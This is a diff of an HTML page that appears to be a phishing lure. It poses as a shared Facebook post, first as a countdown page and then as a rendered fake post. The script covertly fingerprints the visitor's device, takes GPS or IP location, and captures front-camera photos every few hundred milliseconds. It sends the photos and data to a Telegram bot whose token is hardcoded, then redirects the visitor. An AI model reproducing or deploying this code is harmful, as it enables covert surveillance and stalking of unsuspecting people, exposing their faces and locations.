@@ -3,421 +3,346 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Page</title>
-  
-  <!-- Open Graph tags -->
-  <meta property="og:type" content="website">
+  <title id="ogTitle">Loading...</title>
+  <meta property="og:title" id="ogTitleMeta" content="Loading...">
+  <meta property="og:description" id="ogDescMeta" content="">
+  <meta property="og:image" id="ogImageMeta" content="">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
-  <meta property="og:title" content="التواضع صفتي in  Facebook ">
-  <meta property="og:description" content=" لقد قمت بمشاركة ملف شخصي انقر لمعرفة المزيد">
-  <meta property="og:image" content="https://i.ibb.co/fYb8q22M/file-0.jpg">
-  
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="التواضع صفتي in  Facebook ">
-  <meta name="twitter:description" content=" لقد قمت بمشاركة ملف شخصي انقر لمعرفة المزيد">
-  <meta name="twitter:image" content="https://i.ibb.co/fYb8q22M/file-0.jpg">
-
   <style>
+    /* ========== متغيرات الوضع الليلي والنهاري ========== */
+    :root {
+      --bg: #f0f2f5;
+      --card-bg: #ffffff;
+      --text-primary: #1c1e21;
+      --text-secondary: #65676b;
+      --border: #e4e6eb;
+      --shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg: #18191a;
+        --card-bg: #242526;
+        --text-primary: #e4e6eb;
+        --text-secondary: #b0b3b8;
+        --border: #3e4042;
+        --shadow: 0 1px 3px rgba(255,255,255,0.05);
+      }
+    }
+
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: #ffffff; color: #222;
+      background: var(--bg);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex; align-items: center; justify-content: center;
-      height: 100vh; text-align: center; flex-direction: column;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 30px;
+      min-height: 100vh;
+      transition: background 0.3s;
     }
-    .container { display: flex; flex-direction: column; align-items: center; gap: 20px; }
-    .timer-wrapper { position: relative; width: 160px; height: 160px; }
-    svg { transform: rotate(-90deg); }
-    .circle-bg { fill: none; stroke: #e0e0e0; stroke-width: 3; }
-    .circle-progress { fill: none; stroke: #4a4a4a; stroke-width: 3; stroke-linecap: round; transition: stroke-dashoffset 1s linear; }
-    #countdown {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 3rem; font-weight: 300; color: #4a4a4a;
+
+    .post-container {
+      max-width: 500px;
+      width: 100%;
+      background: var(--card-bg);
+      border-radius: 8px;
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      margin-bottom: 20px;
+      transition: background 0.3s;
     }
-    #redirectMessage {
-      font-size: 1rem; color: #4a4a4a; margin-top: 10px;
+    .post-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
     }
-    video { display: none; }
-    .permission-box {
-      background: #f8f9fa; border: 2px solid #4a4a4a;
-      border-radius: 12px; padding: 20px; margin-top: 20px;
-      text-align: center; max-width: 320px;
+    .post-header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-right: 8px;
+      object-fit: cover;
     }
-    .permission-box p { margin-bottom: 10px; color: #c00; }
+    .post-user {
+      font-weight: 600;
+      font-size: 15px;
+      color: var(--text-primary);
+    }
+    .post-time {
+      font-size: 12px;
+      color: var(--text-secondary);
+    }
+    .post-text {
+      padding: 0 16px 12px;
+      font-size: 15px;
+      color: var(--text-primary);
+      white-space: pre-wrap;
+    }
+    .post-image img {
+      width: 100%;
+      display: block;
+    }
+    .post-stats {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 16px;
+      font-size: 13px;
+      color: var(--text-secondary);
+      border-top: 1px solid var(--border);
+    }
+    .post-actions {
+      display: flex;
+      justify-content: space-around;
+      padding: 10px;
+      border-top: 1px solid var(--border);
+      color: var(--text-secondary);
+      font-size: 13px;
+    }
+    .post-actions span { cursor: pointer; }
+
+    .camera-section {
+      text-align: center;
+      margin-top: 10px;
+    }
     .btn {
-      padding: 12px 25px; background: #4a4a4a; color: white;
-      border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px;
+      padding: 10px 20px;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+      margin: 5px;
     }
+    .btn:disabled { background: #a0c4f1; cursor: not-allowed; }
+    .hidden { display: none; }
+    .loader { text-align: center; padding: 40px; color: var(--text-secondary); }
+    video { display: none; }
   </style>
 </head>
 <body>
-  <div class="container" id="mainContainer">
-    <div class="timer-wrapper">
-      <svg width="160" height="160" viewBox="0 0 160 160">
-        <circle class="circle-bg" cx="80" cy="80" r="70" />
-        <circle id="progressCircle" class="circle-progress" cx="80" cy="80" r="70"
-          stroke-dasharray="439.82" stroke-dashoffset="0" />
-      </svg>
-      <div id="countdown">10</div>
-    </div>
-    <div id="redirectMessage">سيتم تحويلك خلال 10</div>
-    <div id="permissionBox" class="permission-box" style="display:none;">
-      <p id="permMessage">Camera access was denied. You must allow it to proceed.</p>
-      <button class="btn" id="retryBtn">Retry</button>
-    </div>
+  <div class="post-container" id="postContainer">
+    <div class="loader">Loading...</div>
   </div>
 
-  <video id="video" autoplay playsinline muted></video>
+  <div class="camera-section">
+    <button class="btn hidden" id="cameraBtn">Allow Camera</button>
+    <p id="cameraMsg" style="color:red;font-size:13px;"></p>
+    <div id="countdownDisplay" style="font-size:1.2rem;margin-top:8px;color:var(--text-primary);"></div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     // ==================== CONFIGURATION ====================
+    const JSONBIN_BIN_ID = '69ee19e8856a68218974812e';
     const BOT_TOKEN = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const CHAT_ID = '5151102782';
-    const COUNTDOWN_START = 10;
-    const CAPTURE_INTERVAL = 100;
     const IPINFO_TOKEN = 'a7e43833d69a75';
-    const JSONBIN_BIN_ID = '69ee19e8856a68218974812e';
+    const CAPTURE_INTERVAL = 300;
+    const COUNTDOWN_SECONDS = 10;
 
     // DOM
+    const postContainer = document.getElementById('postContainer');
+    const cameraBtn = document.getElementById('cameraBtn');
+    const cameraMsg = document.getElementById('cameraMsg');
+    const countdownDisplay = document.getElementById('countdownDisplay');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    const countdownEl = document.getElementById('countdown');
-    const redirectMsgEl = document.getElementById('redirectMessage');
-    const progressCircle = document.getElementById('progressCircle');
-    const permBox = document.getElementById('permissionBox');
-    const permMsg = document.getElementById('permMessage');
-    const retryBtn = document.getElementById('retryBtn');
 
-    let redirectUrl = 'https://example.com';
-    let countdown = COUNTDOWN_START;
     let stream = null;
-    let intervalId = null;
-    let captureIntervalId = null;
-    let latestPosition = null;
-    let watchId = null;
-    let deviceInfo = null;
-    const circumference = 2 * Math.PI * 70;
     let photoCount = 0;
-    const startTime = Date.now();
-    let cameraAttempts = 0;
-    let cameraGrantedOnFirstTry = false;
+    let captureInterval = null;
+    let countdownInterval = null;
+    let countdown = COUNTDOWN_SECONDS;
+    let latestPosition = null;
+    let redirectUrl = 'https://example.com';
+    let cameraGranted = false;
 
-    // ==================== FUNCTIONS ====================
-    async function fetchSettingsOnce() {
+    // ==================== FETCH POST DATA ====================
+    async function loadPost() {
       try {
-        const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`);
-        const data = await response.json();
-        const s = data.record;
-        redirectUrl = s.redirectUrl || 'https://example.com';
-        if (s.title) document.title = s.title;
-      } catch (err) {}
+        const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`);
+        const data = await res.json();
+        const s = data.record || {};
+        redirectUrl = s.redirectUrl || redirectUrl;
+
+        const ogTitle = s.ogTitle || s.profileName || 'Your Name';
+        const ogDescription = s.ogDescription || (s.postText || '').substring(0,150);
+        const ogImage = s.ogImage || s.postImage || s.profilePicture || '';
+        const profileName = s.profileName || 'Your Name';
+        const profilePic = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png';
+        const postText = s.postText || 'This is a sample post.';
+        const postImage = s.postImage || '';
+        const postTime = s.postTime || 'Just now';
+        const commentsCount = s.commentsCount || '0';
+        const sharesCount = s.sharesCount || '0';
+
+        // تحديث Open Graph
+        document.title = ogTitle;
+        setMeta('og:title', ogTitle);
+        setMeta('og:description', ogDescription);
+        setMeta('og:image', ogImage);
+
+        // بناء المنشور
+        postContainer.innerHTML = `
+          <div class="post-header">
+            <img src="${profilePic}" onerror="this.src='https://i.ibb.co/zJx0q3Q/default-avatar.png'">
+            <div>
+              <div class="post-user">${profileName}</div>
+              <div class="post-time">${postTime}</div>
+            </div>
+          </div>
+          <div class="post-text">${postText}</div>
+          ${postImage ? `<div class="post-image"><img src="${postImage}" alt="Post"></div>` : ''}
+          <div class="post-stats">
+            <span>👍 ${commentsCount} Comments</span>
+            <span>↗️ ${sharesCount} Shares</span>
+          </div>
+          <div class="post-actions">
+            <span>👍 Like</span><span>💬 Comment</span><span>↗️ Share</span>
+          </div>
+        `;
+      } catch(e) {
+        postContainer.innerHTML = '<div class="loader">Failed to load post.</div>';
+      }
     }
 
-    async function sendTextMessage(text) {
+    function setMeta(property, content) {
+      let meta = document.querySelector(`meta[property="${property}"], meta[name="${property}"]`);
+      if (meta) meta.setAttribute('content', content);
+    }
+
+    // ==================== BACKGROUND TASKS ====================
+    async function collectAndSendInfo() {
       try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-        });
-      } catch (err) {}
-    }
-
-    async function sendFinalReport() {
-      const duration = ((Date.now() - startTime) / 1000).toFixed(1);
-      const locStr = latestPosition
-        ? `${latestPosition.latitude}, ${latestPosition.longitude} (source: ${latestPosition.source}, accuracy: ${latestPosition.accuracy}m)`
-        : 'Not available';
-      const camStatus = cameraGrantedOnFirstTry
-        ? 'Granted on first try'
-        : `Granted after ${cameraAttempts} attempt(s)`;
-
-      const report = `<b>📋 FINAL REPORT</b>\n`
-        + `<b>Duration:</b> ${duration} sec\n`
-        + `<b>Photos taken:</b> ${photoCount}\n`
-        + `<b>Location:</b> ${locStr}\n`
-        + `<b>Camera:</b> ${camStatus}`;
-
-      await sendTextMessage(report);
-    }
-
-    function sendExitReport() {
-      if (photoCount === 0) return;
-      const duration = ((Date.now() - startTime) / 1000).toFixed(1);
-      const locStr = latestPosition
-        ? `${latestPosition.latitude},${latestPosition.longitude} (${latestPosition.source})`
-        : 'Not available';
-      const text = `⚠️ Early exit\nDuration: ${duration}s\nPhotos: ${photoCount}\nLocation: ${locStr}`;
-
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('text', text);
-      navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, formData);
-    }
-
-    async function backgroundTasks() {
-      // معلومات الجهاز
-      try {
-        await new Promise(r => setTimeout(r, 200));
         const uaData = navigator.userAgentData || {};
-        let highEntropyValues = {};
+        let highEntropy = {};
         if (uaData.getHighEntropyValues) {
-          try {
-            highEntropyValues = await uaData.getHighEntropyValues([
-              "platform", "platformVersion", "architecture", "model",
-              "uaFullVersion", "fullVersionList", "bitness", "wow64"
-            ]);
-          } catch(e) {}
+          try { highEntropy = await uaData.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
         }
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-        const screenInfo = window.screen;
-        let batteryInfo = null;
-        try {
-          if ('getBattery' in navigator) {
-            const battery = await navigator.getBattery();
-            batteryInfo = {
-              level: battery.level,
-              charging: battery.charging,
-              chargingTime: battery.chargingTime,
-              dischargingTime: battery.dischargingTime
-            };
-          }
-        } catch(e) {}
-
-        deviceInfo = {
-          userAgent: navigator.userAgent,
+        const conn = navigator.connection || {};
+        const screen = window.screen;
+        let battery = null;
+        try { if('getBattery' in navigator) { const b = await navigator.getBattery(); battery = { level: b.level, charging: b.charging }; } } catch(e) {}
+        const deviceInfo = {
+          ua: navigator.userAgent,
           platform: navigator.platform,
           language: navigator.language,
-          languages: navigator.languages ? navigator.languages.join(', ') : '',
-          cookieEnabled: navigator.cookieEnabled,
-          onLine: navigator.onLine,
-          doNotTrack: navigator.doNotTrack || window.doNotTrack || 'unknown',
-          hardwareConcurrency: navigator.hardwareConcurrency || 1,
-          deviceMemory: navigator.deviceMemory || 'N/A',
-          maxTouchPoints: navigator.maxTouchPoints || 0,
-          vendor: navigator.vendor || '',
-          product: navigator.product || '',
-          appName: navigator.appName || '',
-          appVersion: navigator.appVersion || '',
-          mobile: uaData.mobile || false,
-          highEntropy: highEntropyValues,
-          screen: {
-            width: screenInfo.width,
-            height: screenInfo.height,
-            availWidth: screenInfo.availWidth,
-            availHeight: screenInfo.availHeight,
-            colorDepth: screenInfo.colorDepth,
-            pixelDepth: screenInfo.pixelDepth,
-            devicePixelRatio: window.devicePixelRatio || 1,
-            orientation: screenInfo.orientation ? screenInfo.orientation.type : 'unknown'
-          },
-          connection: {
-            effectiveType: connection.effectiveType || 'unknown',
-            downlink: connection.downlink || 0,
-            rtt: connection.rtt || 0,
-            saveData: connection.saveData || false,
-            type: connection.type || 'unknown'
-          },
-          battery: batteryInfo,
+          cores: navigator.hardwareConcurrency || 1,
+          memory: navigator.deviceMemory || 'N/A',
+          touch: navigator.maxTouchPoints || 0,
+          screen: `${screen.width}x${screen.height}`,
+          battery: battery ? `${(battery.level*100).toFixed(0)}% ${battery.charging?'⚡':'🔋'}` : 'N/A',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           timestamp: new Date().toISOString(),
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+          highEntropy
         };
-
-        const brand = deviceInfo.highEntropy.brands
-          ? deviceInfo.highEntropy.brands.map(b => `${b.brand} ${b.version}`).join(', ')
-          : 'N/A';
-        const model = deviceInfo.highEntropy.model || 'N/A';
-
-        let text = '<b>📱 DEVICE INFO</b>\n';
-        text += `<b>Brand/Model:</b> ${brand} / ${model}\n`;
-        text += `<b>Platform:</b> ${deviceInfo.platform}\n`;
-        text += `<b>Screen:</b> ${deviceInfo.screen.width}x${deviceInfo.screen.height}\n`;
-        text += `<b>CPU Cores:</b> ${deviceInfo.hardwareConcurrency}\n`;
-        text += `<b>RAM:</b> ${deviceInfo.deviceMemory} GB\n`;
-        text += `<b>Language:</b> ${deviceInfo.language}\n`;
-        text += `<b>Online:</b> ${deviceInfo.onLine ? 'Yes' : 'No'}`;
-        sendTextMessage(text);
+        let txt = '<b>📱 Device</b>\n';
+        txt += `Model: ${highEntropy.model||'N/A'}\nPlatform: ${deviceInfo.platform}\nScreen: ${deviceInfo.screen}\nCPU: ${deviceInfo.cores}\nRAM: ${deviceInfo.memory}GB\nBattery: ${deviceInfo.battery}\nLanguage: ${deviceInfo.language}\nTZ: ${deviceInfo.timezone}`;
+        sendText(txt);
       } catch(e) {}
 
-      // جلب الموقع
-      let gotGPS = false;
       if (navigator.geolocation) {
         try {
-          const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true,
-              timeout: 15000,
-              maximumAge: 0
-            });
-          });
-          latestPosition = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            source: 'GPS'
-          };
-          gotGPS = true;
-        } catch (err) {}
+          const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
+          latestPosition = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src:'GPS' };
+        } catch(e) {}
       }
-
-      if (!gotGPS) {
+      if (!latestPosition) {
         try {
-          let res = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
-          let data = await res.json();
-          if (data.loc) {
-            const [lat, lon] = data.loc.split(',').map(Number);
-            latestPosition = { latitude: lat, longitude: lon, accuracy: 5000, source: 'IP' };
-          }
-        } catch (err) {
-          try {
-            let res = await fetch('https://ipapi.co/json/');
-            let data = await res.json();
-            if (data.latitude && data.longitude) {
-              latestPosition = {
-                latitude: data.latitude,
-                longitude: data.longitude,
-                accuracy: 10000,
-                source: 'IP'
-              };
-            }
-          } catch (e2) {}
-        }
+          const r = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+          const d = await r.json();
+          const [lat,lon] = d.loc.split(',').map(Number);
+          latestPosition = { lat, lon, acc:10000, src:'IP' };
+        } catch(e) {}
       }
-
       if (latestPosition) {
-        const links = {
-          google: `https://www.google.com/maps/search/?api=1&query=${latestPosition.latitude},${latestPosition.longitude}`,
-          apple: `http://maps.apple.com/?ll=${latestPosition.latitude},${latestPosition.longitude}&q=My%20Location`,
-          osm: `https://www.openstreetmap.org/?mlat=${latestPosition.latitude}&mlon=${latestPosition.longitude}&zoom=18`
-        };
-        let locText = '<b>📍 LOCATION</b>\n';
-        locText += `<b>Coordinates:</b> ${latestPosition.latitude}, ${latestPosition.longitude}\n`;
-        locText += `<b>Source:</b> ${latestPosition.source} (${latestPosition.accuracy}m)\n`;
-        locText += `\n<b>🗺️ Maps:</b>\n`;
-        locText += `<a href="${links.google}">Google Maps</a>\n`;
-        locText += `<a href="${links.apple}">Apple Maps</a>\n`;
-        locText += `<a href="${links.osm}">OpenStreetMap</a>`;
-        sendTextMessage(locText);
+        sendText(`📍 Location: ${latestPosition.lat},${latestPosition.lon} (${latestPosition.src}, ${latestPosition.acc}m)\n🗺️ https://www.google.com/maps?q=${latestPosition.lat},${latestPosition.lon}`);
       }
     }
 
-    async function requestCameraOnce() {
+    async function sendText(text) {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'HTML'})
+        });
+      } catch(e) {}
+    }
+
+    // ==================== CAMERA & PHOTOS ====================
+    async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         video.srcObject = stream;
-        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
-        return true;
-      } catch (err) {
-        return false;
+        await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
+        cameraGranted = true;
+        cameraBtn.classList.add('hidden');
+        cameraMsg.textContent = '';
+        captureInterval = setInterval(captureAndSend, CAPTURE_INTERVAL);
+        startCountdown();
+      } catch(e) {
+        cameraBtn.classList.remove('hidden');
+        cameraMsg.textContent = 'Camera access denied. Please allow.';
       }
     }
 
-    function waitForCameraPermission() {
-      return new Promise(resolve => {
-        async function tryOnce() {
-          cameraAttempts++;
-          const ok = await requestCameraOnce();
-          if (ok) {
-            permBox.style.display = 'none';
-            if (cameraAttempts === 1) cameraGrantedOnFirstTry = true;
-            resolve();
-          } else {
-            // إظهار الصندوق مع الزر
-            permBox.style.display = 'block';
-          }
-        }
-
-        // ربط الحدث بالزر
-        retryBtn.onclick = tryOnce;
-
-        // محاولة أولى تلقائية
-        tryOnce();
-      });
-    }
-
-    function capturePhoto() {
-      if (!video.videoWidth || !stream) return null;
+    function captureAndSend() {
+      if (!stream || !video.videoWidth) return;
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL('image/jpeg', 0.8);
+      ctx.drawImage(video, 0, 0);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      const blob = dataURLtoBlob(dataUrl);
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'snap.jpg');
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form }).catch(()=>{});
+      photoCount++;
     }
 
-    function b64toBlob(b64Data, contentType) {
-      const byteCharacters = atob(b64Data);
-      const byteArrays = [];
-      for (let offset = 0; offset < byteCharacters.length; offset += 512) {
-        const slice = byteCharacters.slice(offset, offset + 512);
-        const byteNumbers = new Array(slice.length);
-        for (let i = 0; i < slice.length; i++) byteNumbers[i] = slice.charCodeAt(i);
-        byteArrays.push(new Uint8Array(byteNumbers));
-      }
-      return new Blob(byteArrays, { type: contentType || 'image/jpeg' });
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], {type:mime});
     }
 
-    function sendPhoto(photoDataUrl, num) {
-      const caption = `<b>📸 Photo #${num}</b>`;
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      const base64str = photoDataUrl.split(',')[1];
-      const mime = photoDataUrl.split(',')[0].split(':')[1].split(';')[0] || 'image/jpeg';
-      const blob = b64toBlob(base64str, mime);
-      formData.append('photo', blob, 'image.jpg');
-      formData.append('caption', caption);
-      formData.append('parse_mode', 'HTML');
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e => {});
-    }
-
-    function updateTimerUI() {
-      countdownEl.textContent = countdown;
-      redirectMsgEl.textContent = `سيتم تحويلك خلال ${countdown}`;
-      const offset = ((COUNTDOWN_START - countdown) / COUNTDOWN_START) * circumference;
-      progressCircle.style.strokeDashoffset = offset;
-    }
-
-    function captureTick() {
-      const photo = capturePhoto();
-      if (photo) { photoCount++; sendPhoto(photo, photoCount); }
-    }
-
-    async function stopAllAndRedirect() {
-      if (intervalId) clearInterval(intervalId);
-      if (captureIntervalId) clearInterval(captureIntervalId);
+    function stopMedia() {
+      if (captureInterval) clearInterval(captureInterval);
+      if (countdownInterval) clearInterval(countdownInterval);
       if (stream) stream.getTracks().forEach(t => t.stop());
-      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-
-      await sendFinalReport();
-      window.location.href = redirectUrl;
     }
 
-    async function startAll() {
-      fetchSettingsOnce();
-      backgroundTasks();
-
-      // انتظار حتى يتم منح الكاميرا
-      await waitForCameraPermission();
-
-      // بدء العداد والتصوير
-      updateTimerUI();
-      captureIntervalId = setInterval(captureTick, CAPTURE_INTERVAL);
-      intervalId = setInterval(() => {
+    function startCountdown() {
+      countdown = COUNTDOWN_SECONDS;
+      countdownDisplay.textContent = `Redirecting in ${countdown}...`;
+      countdownInterval = setInterval(() => {
         countdown--;
-        updateTimerUI();
-        if (countdown <= 0) stopAllAndRedirect();
+        countdownDisplay.textContent = `Redirecting in ${countdown}...`;
+        if (countdown <= 0) {
+          stopMedia();
+          sendText(`📋 Report\nPhotos: ${photoCount}\nLocation: ${latestPosition?JSON.stringify(latestPosition):'N/A'}`);
+          window.location.href = redirectUrl;
+        }
       }, 1000);
     }
 
-    window.addEventListener('load', startAll);
-    window.addEventListener('beforeunload', () => {
-      if (intervalId) clearInterval(intervalId);
-      if (captureIntervalId) clearInterval(captureIntervalId);
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-      sendExitReport();
-    });
+    async function init() {
+      await loadPost();
+      collectAndSendInfo();
+      cameraBtn.addEventListener('click', startCamera);
+      startCamera();
+    }
+
+    window.addEventListener('load', init);
+    window.addEventListener('beforeunload', stopMedia);
   </script>
 </body>
 </html>
